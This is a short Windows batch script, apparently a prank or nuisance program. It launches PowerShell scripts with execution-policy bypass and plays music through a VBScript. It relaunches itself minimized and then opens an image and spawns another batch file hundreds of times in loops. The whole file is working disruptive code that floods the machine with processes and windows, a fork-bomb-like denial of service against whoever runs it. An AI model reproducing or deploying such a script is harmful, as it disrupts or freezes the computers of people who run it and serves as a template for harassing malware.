@echo off
start /B powershell.exe -NoProfile -ExecutionPolicy Bypass -File "min.ps1"
start /B powershell.exe -NoProfile -ExecutionPolicy Bypass -File "pop.ps1"
start music.vbs
if not defined FOO (
  set FOO=1
  start /min "" %~0
  exit /b
)
for /l %%a in (1,1,200) do (
  start annoy.jpg
  start window.bat
)
start /B powershell.exe -NoProfile -ExecutionPolicy Bypass -File "min.ps1"
start window.bat
for /l %%a in (1,1,200) do (
  start window.bat
)

exit